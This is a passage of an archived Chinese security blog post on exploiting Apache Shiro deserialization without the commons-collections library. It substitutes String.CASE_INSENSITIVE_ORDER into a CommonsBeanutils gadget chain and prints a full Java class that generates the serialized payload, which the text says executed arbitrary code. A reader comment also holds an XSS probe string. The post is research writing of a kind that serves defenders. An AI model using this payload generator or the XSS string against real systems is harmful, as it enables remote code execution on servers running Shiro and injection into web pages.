+<p>Unable to load class named [org.apache.commons.collections.comparators.ComparableComparator]</p>
+</blockquote>
+<p>简单来说就是没找到<code>org.apache.commons.collections.comparators.ComparableComparator</code>类，从包名即可看出，这个类是来自于commons-collections。</p>
+<p>commons-beanutils本来依赖于commons-collections，但是在Shiro中，它的commons-beanutils虽然包含了一部分commons-collections的类，但却不全。这也导致，正常使用Shiro的时候不需要依赖于commons-collections，但反序列化利用的时候需要依赖于commons-collections。</p>
+<p>难道没有commons-collections就无法进行反序列化利用吗？当然有。</p>
+<h2 id="shiro"><a class="toclink" href="#shiro">无依赖的Shiro反序列化利用链</a></h2>
+<p>我们先来看看<code>org.apache.commons.collections.comparators.ComparableComparator</code>这个类在哪里使用了：</p>
+<p><a href="../media/attachment/2021/04/19/05d65b04-8d04-42e3-aca7-306ca2851411.png"><img alt="image-20210403051619894.png" src="../media/attachment/2021/04/19/05d65b04-8d04-42e3-aca7-306ca2851411.e8b420fca33a.png" /></a></p>
+<p>在<code>BeanComparator</code>类的构造函数处，当没有显式传入<code>Comparator</code>的情况下，则默认使用<code>ComparableComparator</code>。</p>
+<p>既然此时没有<code>ComparableComparator</code>，我们需要找到一个类来替换，它满足下面这几个条件：</p>
+<ul>
+<li>实现<code>java.util.Comparator</code>接口</li>
+<li>实现<code>java.io.Serializable</code>接口</li>
+<li>Java、shiro或commons-beanutils自带，且兼容性强</li>
+</ul>
+<p>通过IDEA的功能，我们找到一个<code>CaseInsensitiveComparator</code>：</p>
+<p><a href="../media/attachment/2021/04/19/b1d1e148-86e6-4649-88f4-7dba57b322d4.png"><img alt="image-20210403053120851.png" src="../media/attachment/2021/04/19/b1d1e148-86e6-4649-88f4-7dba57b322d4.a723eeef1ee1.png" /></a></p>
+<p>相关代码如下：</p>
+<div class="codehilite"><pre><span></span><code><span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">Comparator</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">CASE_INSENSITIVE_ORDER</span>
+    <span class="o">=</span> <span class="k">new</span> <span class="n">CaseInsensitiveComparator</span><span class="p">();</span>
+<span class="kd">private</span> <span class="kd">static</span> <span class="kd">class</span> <span class="nc">CaseInsensitiveComparator</span>
+    <span class="kd">implements</span> <span class="n">Comparator</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">Serializable</span> <span class="p">{</span>
+    <span class="c1">// use serialVersionUID from JDK 1.2.2 for interoperability</span>
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">long</span> <span class="n">serialVersionUID</span> <span class="o">=</span> <span class="mi">8575799808933029326L</span><span class="p">;</span>
+
+    <span class="kd">public</span> <span class="kt">int</span> <span class="nf">compare</span><span class="p">(</span><span class="n">String</span> <span class="n">s1</span><span class="p">,</span> <span class="n">String</span> <span class="n">s2</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kt">int</span> <span class="n">n1</span> <span class="o">=</span> <span class="n">s1</span><span class="p">.</span><span class="na">length</span><span class="p">();</span>
+        <span class="kt">int</span> <span class="n">n2</span> <span class="o">=</span> <span class="n">s2</span><span class="p">.</span><span class="na">length</span><span class="p">();</span>
+        <span class="kt">int</span> <span class="n">min</span> <span class="o">=</span> <span class="n">Math</span><span class="p">.</span><span class="na">min</span><span class="p">(</span><span class="n">n1</span><span class="p">,</span> <span class="n">n2</span><span class="p">);</span>
+        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">min</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="kt">char</span> <span class="n">c1</span> <span class="o">=</span> <span class="n">s1</span><span class="p">.</span><span class="na">charAt</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
+            <span class="kt">char</span> <span class="n">c2</span> <span class="o">=</span> <span class="n">s2</span><span class="p">.</span><span class="na">charAt</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">c1</span> <span class="o">!=</span> <span class="n">c2</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">c1</span> <span class="o">=</span> <span class="n">Character</span><span class="p">.</span><span class="na">toUpperCase</span><span class="p">(</span><span class="n">c1</span><span class="p">);</span>
+                <span class="n">c2</span> <span class="o">=</span> <span class="n">Character</span><span class="p">.</span><span class="na">toUpperCase</span><span class="p">(</span><span class="n">c2</span><span class="p">);</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">c1</span> <span class="o">!=</span> <span class="n">c2</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="n">c1</span> <span class="o">=</span> <span class="n">Character</span><span class="p">.</span><span class="na">toLowerCase</span><span class="p">(</span><span class="n">c1</span><span class="p">);</span>
+                    <span class="n">c2</span> <span class="o">=</span> <span class="n">Character</span><span class="p">.</span><span class="na">toLowerCase</span><span class="p">(</span><span class="n">c2</span><span class="p">);</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="n">c1</span> <span class="o">!=</span> <span class="n">c2</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="c1">// No overflow because of numeric promotion</span>
+                        <span class="k">return</span> <span class="n">c1</span> <span class="o">-</span> <span class="n">c2</span><span class="p">;</span>
+                    <span class="p">}</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="n">n1</span> <span class="o">-</span> <span class="n">n2</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="cm">/** Replaces the de-serialized object. */</span>
+    <span class="kd">private</span> <span class="n">Object</span> <span class="nf">readResolve</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="n">CASE_INSENSITIVE_ORDER</span><span class="p">;</span> <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>这个<code>CaseInsensitiveComparator</code>类是<code>java.lang.String</code>类下的一个内部私有类，其实现了<code>Comparator</code>和<code>Serializable</code>，且位于Java的核心代码中，兼容性强，是一个完美替代品。</p>
+<p>我们通过<code>String.CASE_INSENSITIVE_ORDER</code>即可拿到上下文中的<code>CaseInsensitiveComparator</code>对象，用它来实例化<code>BeanComparator</code>：</p>
+<div class="codehilite"><pre><span></span><code><span class="kd">final</span> <span class="n">BeanComparator</span> <span class="n">comparator</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BeanComparator</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="n">String</span><span class="p">.</span><span class="na">CASE_INSENSITIVE_ORDER</span><span class="p">);</span>
+</code></pre></div>
+
+<p>最后，构造出新的CommonsBeanutils1Shiro利用链：</p>
+<div class="codehilite"><pre><span></span><code><span class="kn">package</span> <span class="nn">com.govuln.shiroattack</span><span class="p">;</span>
+
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.beanutils.BeanComparator</span><span class="p">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.util.PriorityQueue</span><span class="p">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CommonsBeanutils1Shiro</span> <span class="p">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieldValue</span><span class="p">(</span><span class="n">Object</span> <span class="n">obj</span><span class="p">,</span> <span class="n">String</span> <span class="n">fieldName</span><span class="p">,</span> <span class="n">Object</span> <span class="n">value</span><span class="p">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="p">{</span>
+        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">obj</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="n">fieldName</span><span class="p">);</span>
+        <span class="n">field</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+        <span class="n">field</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kd">public</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">getPayload</span><span class="p">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">clazzBytes</span><span class="p">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="p">{</span>
+        <span class="n">TemplatesImpl</span> <span class="n">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="p">();</span>
+        <span class="n">setFieldValue</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="s">&quot;_bytecodes&quot;</span><span class="p">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span><span class="n">clazzBytes</span><span class="p">});</span>
+        <span class="n">setFieldValue</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="s">&quot;_name&quot;</span><span class="p">,</span> <span class="s">&quot;HelloTemplatesImpl&quot;</span><span class="p">);</span>
+        <span class="n">setFieldValue</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="s">&quot;_tfactory&quot;</span><span class="p">,</span> <span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="p">());</span>
+
+        <span class="kd">final</span> <span class="n">BeanComparator</span> <span class="n">comparator</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BeanComparator</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="n">String</span><span class="p">.</span><span class="na">CASE_INSENSITIVE_ORDER</span><span class="p">);</span>
+        <span class="kd">final</span> <span class="n">PriorityQueue</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">queue</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PriorityQueue</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">comparator</span><span class="p">);</span>
+        <span class="c1">// stub data for replacement later</span>
+        <span class="n">queue</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="s">&quot;1&quot;</span><span class="p">);</span>
+        <span class="n">queue</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="s">&quot;1&quot;</span><span class="p">);</span>
+
+        <span class="n">setFieldValue</span><span class="p">(</span><span class="n">comparator</span><span class="p">,</span> <span class="s">&quot;property&quot;</span><span class="p">,</span> <span class="s">&quot;outputProperties&quot;</span><span class="p">);</span>
+        <span class="n">setFieldValue</span><span class="p">(</span><span class="n">queue</span><span class="p">,</span> <span class="s">&quot;queue&quot;</span><span class="p">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">obj</span><span class="p">,</span> <span class="n">obj</span><span class="p">});</span>
+
+        <span class="c1">// ==================</span>
+        <span class="c1">// 生成序列化字符串</span>
+        <span class="n">ByteArrayOutputStream</span> <span class="n">barr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="p">();</span>
+        <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">barr</span><span class="p">);</span>
+        <span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">queue</span><span class="p">);</span>
+        <span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span>
+
+        <span class="k">return</span> <span class="n">barr</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>发送这个利用链生成的Payload，成功执行任意代码：</p>
+<p><a href="../media/attachment/2021/04/19/4c5caabb-afe9-4a5c-8291-dc8cfba1bfcc.png"><img alt="image-20210403054306786.png" src="../media/attachment/2021/04/19/4c5caabb-afe9-4a5c-8291-dc8cfba1bfcc.fdc163f9cced.png" /></a></p>
+<h2 id="_2"><a class="toclink" href="#_2">总结</a></h2>
+<p>本文信息量有点大，本文第一个重点是了解了Apache Commons Beanutils这个库的作用，然后学习了CommonsBeanutils1利用链的原理和简化版。</p>
+<p>本文第二个重点是，在没有commons-collections依赖的情况下，shiro反序列化漏洞如何借助其自带的commons-beanutils触发反序列化命令执行漏洞。</p>
+<p>最后不得不说，『代码审计』知识星球卧虎藏龙，shiro无依赖利用灵感来源于某篇帖子的一个回复：</p>
+<p><a href="../media/attachment/2021/04/19/12ec17b2-2ea6-4452-bc34-56f3d93cd762.png"><img alt="image-20210403054817303.png" src="../media/attachment/2021/04/19/12ec17b2-2ea6-4452-bc34-56f3d93cd762.07ea6668e673.png" /></a></p>
+<p>虽然本文没有用到回帖里的<code>java.util.Collections$ReverseComparator</code>，但其实原理是相同的，十分感谢。</p>
+          </div>
+        </article>
+
+        
+          <h1 class="h1 color-main">赞赏</h1>
+          <div class="zan text-center">
+            <p>喜欢这篇文章？打赏1元</p>
+            <p class="m-0"><img src="../static/wx.jpg" width="280" alt=""></p>
+          </div>
+        
+
+        <div id="reply-list">
+          <h1 class="h1 color-main">评论</h1>
+          
+            
+              <div class="flex mb-2" id="comment-3852">
+                <div class="gravatar">
+                  <img src="../static/placeholder.jpg" width="40px" height="40px" alt="">
+                </div>
+                <div class="ps-2">
+                  <p class="comment-meta title">
+                    <a href="" target="_blank" rel="nofollow noopener">adwaw</a>
+                    <time datetime="2022年4月16日 12:28" itemprop="datePublished">
+                      2022 四月 16 12:28
+                    </time>
+                    <a href="javascript:reply_to('3852', 'adwaw')">回复</a>
+                  </p>
+                  <p class="comment-meta">&lt;img src=x onerror=&quot;alert(111)&quot;&gt;</p>
+                </div>
+              </div>
+              
+            
+              <div class="flex mb-2" id="comment-3801">
+                <div class="gravatar">
+                  <img src="../static/placeholder.jpg" width="40px" height="40px" alt="">
+                </div>
+                <div class="ps-2">
+                  <p class="comment-meta title">
+                    <a href="" target="_blank" rel="nofollow noopener">哈哈</a>
+                    <time datetime="2022年1月23日 10:28" itemprop="datePublished">
+                      2022 一月 23 10:28
+                    </time>
+                    <a href="javascript:reply_to('3801', '%E5%93%88%E5%93%88')">回复</a>
+                  </p>
+                  <p class="comment-meta">顶礼膜拜</p>
+                </div>
+              </div>
+              
+            
+              <div class="flex mb-2" id="comment-3664">
+                <div class="gravatar">
+                  <img src="../static/placeholder.jpg" width="40px" height="40px" alt="">
+                </div>
+                <div class="ps-2">
+                  <p class="comment-meta title">
+                    <a href="" target="_blank" rel="nofollow noopener">ad05n</a>
+                    <time datetime="2021年6月15日 19:17" itemprop="datePublished">
+                      2021 六月 15 19:17
+                    </time>
+                    <a href="javascript:reply_to('3664', 'ad05n')">回复</a>
+                  </p>
+                  <p class="comment-meta">感谢师傅，解决了我的一个疑惑</p>
+                </div>
+              </div>
+              
+            
+              <div class="flex mb-2" id="comment-3646">
+                <div class="gravatar">
+                  <img src="../static/placeholder.jpg" width="40px" height="40px" alt="">
+                </div>
+                <div class="ps-2">
+                  <p class="comment-meta title">
+                    <a href="" target="_blank" rel="nofollow noopener">ruLe4Ker4pwn</a>
+                    <time datetime="2021年4月20日 20:03" itemprop="datePublished">
+                      2021 四月 20 20:03
+                    </time>
+                    <a href="javascript:reply_to('3646', 'ruLe4Ker4pwn')">回复</a>
+                  </p>
+                  <p class="comment-meta">讲的很细致啊</p>
+                </div>
+              </div>
+              
+            
+          
+        </div>
+
+        
+
+        <form method="post" enctype="multipart/form-data" action="#reply" id="reply" class="mb-4">
+          <div class="container-fluid px-0">
+            
+            <div class="row">
+              <div class="col">
+                <textarea name="content" cols="40" rows="6" required id="id_content">
+</textarea>
+              </div>
+            </div>
+            <div class="row gx-2">
+              <div class="col-4">
+                <input type="text" name="nickname" placeholder="昵称" maxlength="64" required id="id_nickname">
+              </div>
+              <div class="col-4">
+                <input type="text" name="email" placeholder="邮箱（可留空）" maxlength="254" id="id_email">
+              </div>
+              <div class="col-4">
+                <input type="text" name="url" placeholder="链接（可留空）" maxlength="200" id="id_url">
+              </div>
+            </div>
+          </div>
+          <div class="row">
+            <div class="col-4">
+              <div class="row gx-2" style="margin-top: 8px"><div class="col-6"><input autocomplete="off" id="id_captcha_1" name="captcha_1" type="text" placeholder="验证码" /> <input id="id_captcha_0" name="captcha_0" type="hidden" value="fc20d33f5796af845f2a41a30020b6d0ad9571ba" />
+</div><div class="col-6">
+<img src="../captcha/image/fc20d33f5796af845f2a41a30020b6d0ad9571ba/index.png" alt="captcha" class="captcha" /></div></div>
+            </div>
+          </div>
+          <div class="row">
+            <div class="col">
+              <input type="submit" class="ui-button ui-button-sgreen" value="提交">
+            </div>
+          </div>
+          <input type="hidden" name="archive" value="463" id="id_archive">
+          <input type="hidden" name="parent" id="id_parent">
+          <input type="hidden" name="csrfmiddlewaretoken" value="JUks3Di9Qf9n7XTdiA0l602M3067lmzivsIjBITSeBn6FvHBkBX63t5RonniUYLA">
+        </form>
+      </div>
+    </div>
+    <div class="row justify-content-center">
+      <div class="col-lg-7 col-md-10 col-sm-12">
+        <footer class="footer mx-auto">
+  <div class="footer-left">
+    Copyright &copy; 2023 Powered by talkbook
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <li><a href="../index.html">首页</a></li>
+        <li><a href="../feed/index.rss" target="_blank">RSS订阅</a></li>
+        <li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+        <li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+        <li><a href="../index.html">更换模板</a></li>
+      </ul>
+    </nav>
+  </div>
+</footer>
+      </div>
+    </div>
+  </div>
+
+<script src="https://cdn.staticfile.org/jquery/2.2.4/jquery.min.js"></script>
+<script src="../static/cactus/js/main%EF%B9%96v=2021102502.js"></script>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-FF5KPQ1CZ6"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-FF5KPQ1CZ6');
+</script>
+
+  <script src="https://cdn.staticfile.org/fancybox/2.1.7/js/jquery.fancybox.min.js"></script>
+  <script>
+      $(document).ready(function () {
+          $(".content a").each(function (i, e) {
+              if (e.host != 'www.leavesongs.com') {
+                  e.target = '_blank';
+              }
+          });
+          $(".content img").each(function (i, e) {
+              if (e.parentNode.tagName.toUpperCase() != 'A') {
+                  $(e).wrap('<a href="' + escapeHtml(e.src) + '" class="fancybox"></a>');
+              } else {
+                  $(e.parentNode).addClass('fancybox');
+              }
+          });
+          $('.fancybox').fancybox();
+      })
+  </script>
+
+</body>
+</html>
